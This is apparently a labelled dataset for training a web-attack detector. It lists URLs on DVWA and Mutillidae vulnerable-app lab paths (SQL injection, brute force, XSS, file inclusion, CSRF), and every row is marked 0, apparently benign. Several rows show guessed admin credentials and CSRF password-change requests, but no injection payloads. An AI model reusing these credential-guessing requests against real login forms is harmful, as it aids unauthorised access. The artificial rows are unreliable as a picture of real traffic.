URI,label
test.com/dvwa/about.php/vulnerabilities/sqli_blind/132,0
test.com/pages,0
test.com,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/1,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/12,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/13,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/16,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/21,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/19,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/23,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/17,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/24,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/100,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/48,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/38,0
test.com/mutillidae/index.php?page=login.php,0
test.com/mutillidae/index.php?username=admin&password=pass&login-php-submit-button=Login,0
test.com/mutillidae/index.php?username=admin&pas=pass&login-php-submit-button=Login,0
test.com/mutillidae/index.php?username=admin&pass=pass&login-php-submit-button=Login,0
test.com/mutillidae/index.php?username=admin&admin=pass&login-php-submit-button=Login,0
test.com/mutillidae/index.php?username=admin&mypass=pass&login-php-submit-button=Login,0
test.com/mutillidae/index.php?username=administrator&password=pass&login-php-submit-button=Login,0
test.com/mutillidae/index.php?username=administrator&password=password&login-php-submit-button=Login,0
test.com/mutillidae/index.php?username=administrator&password=mypass&login-php-submit-button=Login,0
test.com/mutillidae/index.php?username=administrator&password=mypassword&login-php-submit-button=Login,0
test.com/mutillidae/index.php?username=paul&password=pass&login-php-submit-button=Login,0
test.com/mutillidae/index.php?username=paul&password=mypass&login-php-submit-button=Login,0
test.com/mutillidae/index.php?username=paul&pass=mypass&login-php-submit-button=Login,0
test.com/mutillidae/index.php?username=ali&password=mypass&login-php-submit-button=Login,0
test.com/mutillidae/index.php?username=ali&pass=mypass&login-php-submit-button=Login,0
test.com/csrf/vulnerabilities/exec/#,0
test.com/csrf/vulnerabilities/exec/1,0
test.com/csrf/vulnerabilities/exec/25,0
test.com/csrf/vulnerabilities/exec/100,0
test.com/csrf/vulnerabilities/exec/20,0
test.com/csrf/vulnerabilities/exec/25,0
test.com/csrf/vulnerabilities/exec/305,0
test.com/csrf/vulnerabilities/exec/21,0
test.com/csrf/vulnerabilities/exec/17,0
test.com/csrf/vulnerabilities/exec/98,0
test.com/sql/vulnerabilities/csrf/?password_new=newpass&password_conf=newpass&Change=Change#,0
test.com/sql/vulnerabilities/csrf/?password_new=pass&password_conf=pass&Change=Change#,0
test.com/sql/vulnerabilities/csrf/?password_new=newpass&password_conf=newpass&Change=Change#,0
test.com/sql/vulnerabilities/csrf/?password_new=new&password_conf=new&Change=Change#,0
test.com/sql/vulnerabilities/csrf/?password_new=nene&password_conf=nene&Change=Change#,0
test.com/sql/vulnerabilities/csrf/?password_new=markee&password_conf=markee&Change=Change#,0
test.com/sql/vulnerabilities/csrf/?password_new=findon&password_conf=findon&Change=Change#,0
test.com/sql/vulnerabilities/csrf/?password_new=newpass&password_conf=newpass&Change=Change#,0
test.com/sql/vulnerabilities/csrf/?password_new=henet&password_conf=henet&Change=Change#,0
test.com/sql/vulnerabilities/csrf/?password_new=drink1&password_conf=drink1&Change=Change#,0
test.com/sql/vulnerabilities/csrf/?password_new=01233&password_conf=01233&Change=Change#,0
test.com/sql/vulnerabilities/csrf/?password_new=newbee&password_conf=newbee&Change=Change#,0
test.com/sql/vulnerabilities/csrf/?password_new=fromcome1&password_conf=fromcome1&Change=Change#,0
test.com/sql/vulnerabilities/csrf/?password_new=esi123&password_conf=esi123&Change=Change#,0
test.com/sql/vulnerabilities/csrf/?password_new=book1&password_conf=book1&Change=Change#,0
test.com/sql/vulnerabilities/csrf/?password_new=hardone&password_conf=hardone&Change=Change#,0
test.com/sql/vulnerabilities/csrf/?password_new=newfield&password_conf=newfield&Change=Change#,0
test.com/sql/vulnerabilities/csrf/?password_new=newthings1&password_conf=newthings1&Change=Change#,0
test.com/sql/vulnerabilities/csrf/?password_new=boatboat&password_conf=boatboat&Change=Change#,0
test.com/sql/vulnerabilities/csrf/?password_new=password12&password_conf=password12&Change=Change#,0
test.com/sql/vulnerabilities/csrf/?password_new=bananas23&password_conf=bananas23&Change=Change#,0
test.com/sql/vulnerabilities/csrf/?password_new=zhanda&password_conf=zhanda&Change=Change#,0
test.com/sql/vulnerabilities/csrf/?password_new=admin142&password_conf=admin142&Change=Change#,0
test.com/sql/vulnerabilities/csrf/?password_new=admin343&password_conf=admin142&Change=Change#,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/1,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/4,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/34,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/103,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/13,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/11,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/15,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/18,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/23,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/19,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/26,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/31,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/34,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/instructions.php/1,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/instructions.php/2,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/instructions.php/4,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/instructions.php/13,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/instructions.php/12,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/instructions.php/15,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/instructions.php/17,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/instructions.php/18,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/instructions.php/100,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/instructions.php/55,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/instructions.php/23,0
test.com/dvwa/vulnerabilities/sqli/?id=1000&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=10&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=100&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=2000&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=200&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=20&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=2&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=3000&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=300&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=30&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=3&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=40&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=4&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=400&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=5&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=6&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=7&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=8&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=9&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=11&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=12&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=23&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=24&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=27&Submit=Submit#,0
test.com/mutillidae/index.php?username=admin&password=pass&login-php-submit-button=Login,0
test.com/mutillidae/index.php?username=admin&password=pass1&login-php-submit-button=Login,0
test.com/mutillidae/index.php?username=admin&password=pass2&login-php-submit-button=Login,0
test.com/mutillidae/index.php?username=admin&password=pass3&login-php-submit-button=Login,0
test.com/mutillidae/index.php?username=admin2&password=pass3&login-php-submit-button=Login,0
test.com/mutillidae/index.php?username=admin2&password=pass123&login-php-submit-button=Login,0
test.com/mutillidae/index.php?username=alloye&password=mypassword&login-php-submit-button=Login,0
test.com/mutillidae/index.php?username=alice&password=castlemyshoe2&login-php-submit-button=Login,0
test.com/mutillidae/index.php?username=hilda&password=pass3&login-php-submit-button=Login,0
test.com/mutillidae/index.php?username=fifi&password=password45&login-php-submit-button=Login,0
test.com/mutillidae/index.php?username=emma&password=emmanuel43&login-php-submit-button=Login,0
test.com/mutillidae/index.php?username=kaur&password=1234567&login-php-submit-button=Login,0
test.com/mutillidae/index.php?username=finson&password=smith45&login-php-submit-button=Login,0
test.com/mutillidae/index.php?username=little&password=bigoo2&login-php-submit-button=Login,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/setup.php/1,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/setup.php/11,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/setup.php/12,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/setup.php/18,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/setup.php/21,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/setup.php/10,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/setup.php/23,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/setup.php/26,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/setup.php/27,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/setup.php/19,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/setup.php/34,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/setup.php/37,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/setup.php/112,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/setup.php/32,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/setup.php/154,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/setup.php/54,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/setup.php/39,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/setup.php/60,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/setup.php/162,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/setup.php/64,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/setup.php/66,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/setup.php/68,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/setup.php/70,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/setup.php/74,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/setup.php/92,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/1,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/11,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/14,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/8,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/7,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/9,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/4,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/3,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/2,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/12,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/13,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/67,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/43,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/23,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/41,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/50,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/51,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/52,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/?page=include.php/1,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/?page=include.php/2,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/?page=include.php/3,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/?page=include.php/5,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/?page=include.php/6,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/?page=include.php/11,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/?page=include.php/12,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/?page=include.php/30,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/?page=include.php/131,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/?page=include.php/134,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/?page=include.php/42,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/?page=include.php/45,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/?page=include.php/147,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/?page=include.php/48,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/?page=include.php/50,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/?page=include.php/51,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/?page=include.php/56,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/?page=include.php/58,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/?page=include.php/79,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/?page=include.php/76,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/?page=include.php/63,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/?page=include.php/91,0
test.com/dvwa/vulnerabilities/xss_r/?name=finsk#,0
test.com/dvwa/vulnerabilities/xss_r/?name=mark#,0
test.com/dvwa/vulnerabilities/xss_r/?name=joe#,0
test.com/dvwa/vulnerabilities/xss_r/?name=john#,0
test.com/dvwa/vulnerabilities/xss_r/?name=wenny#,0
test.com/dvwa/vulnerabilities/xss_r/?name=kaur#,0
test.com/dvwa/vulnerabilities/xss_r/?name=hinnk#,0
test.com/dvwa/vulnerabilities/xss_r/?name=benny#,0
test.com/dvwa/vulnerabilities/xss_r/?name=mike#,0
test.com/dvwa/vulnerabilities/xss_r/?name=assembly#,0
test.com/dvwa/vulnerabilities/xss_r/?name=henry#,0
test.com/dvwa/vulnerabilities/xss_r/?name=mohammed#,0
test.com/dvwa/vulnerabilities/xss_r/?name=ali#,0
test.com/dvwa/vulnerabilities/xss_r/?name=bright#,0
test.com/dvwa/vulnerabilities/xss_r/?name=peter#,0
test.com/dvwa/vulnerabilities/xss_r/?name=lily#,0
test.com/dvwa/vulnerabilities/xss_r/?name=katur#,0
test.com/dvwa/vulnerabilities/xss_r/?name=tophy#,0
test.com/dvwa/vulnerabilities/xss_r/?name=pretty#,0
test.com/dvwa/vulnerabilities/xss_r/?name=antonio#,0
test.com/dvwa/vulnerabilities/xss_r/?name=hernandez#,0
test.com/dvwa/vulnerabilities/xss_r/?name=ali#,0
test.com/dvwa/vulnerabilities/xss_r/?name=Reza#,0
test.com/dvwa/vulnerabilities/xss_r/?name=finance#,0
test.com/dvwa/vulnerabilities/sqli/?id=300&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=220&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=610&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=380&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=670&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=675&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=80&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=67&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=617&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=231&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=77&Submit=Submit#,0
test.com/dvwa/vulnerabilities/brute/?username=paul&password=test&Login=Login#,0
test.com/dvwa/vulnerabilities/brute/?username=paul&password=test&Login=Login#,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/21,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/20,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/19,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/18,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/17,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/16,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/15,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/14,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/13,0
test.com/mutillidae/index.php?page=notes.php,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/10,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/11,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/12,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/9,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/8,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/7,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/6,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/5,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/4,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/3,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/2,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/1,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/vulnerabilities/upload/vulnerabilities/xss_s/15,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/vulnerabilities/upload/vulnerabilities/xss_s/16,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/vulnerabilities/upload/vulnerabilities/xss_s/17,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/vulnerabilities/upload/vulnerabilities/xss_s/14,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/vulnerabilities/upload/vulnerabilities/xss_s/12,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/vulnerabilities/upload/vulnerabilities/xss_s/13,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/vulnerabilities/upload/vulnerabilities/xss_s/11,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/vulnerabilities/upload/vulnerabilities/xss_s/10,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/vulnerabilities/upload/vulnerabilities/xss_s/9,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/vulnerabilities/upload/vulnerabilities/xss_s/8,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/vulnerabilities/upload/vulnerabilities/xss_s/7,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/vulnerabilities/upload/vulnerabilities/xss_s/6,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/vulnerabilities/upload/vulnerabilities/xss_s/5,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/vulnerabilities/upload/vulnerabilities/xss_s/4,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/vulnerabilities/upload/vulnerabilities/xss_s/3,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/vulnerabilities/upload/vulnerabilities/xss_s/2,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/vulnerabilities/upload/vulnerabilities/xss_s/1,0
test.com/dvwa/about.php/20,0
test.com/dvwa/about.php/21,0
test.com/dvwa/about.php/22,0
test.com/dvwa/about.php/23,0
test.com/dvwa/about.php/24,0
test.com/dvwa/about.php/25,0
test.com/dvwa/about.php/26,0
test.com/dvwa/about.php/27,0
test.com/dvwa/about.php/28,0
test.com/dvwa/about.php/29,0
test.com/dvwa/about.php/19,0
test.com/dvwa/about.php/18,0
test.com/dvwa/about.php/17,0
test.com/dvwa/about.php/16,0
test.com/dvwa/about.php/15,0
test.com/dvwa/about.php/14,0
test.com/dvwa/about.php/13,0
test.com/dvwa/about.php/12,0
test.com/dvwa/about.php/11,0
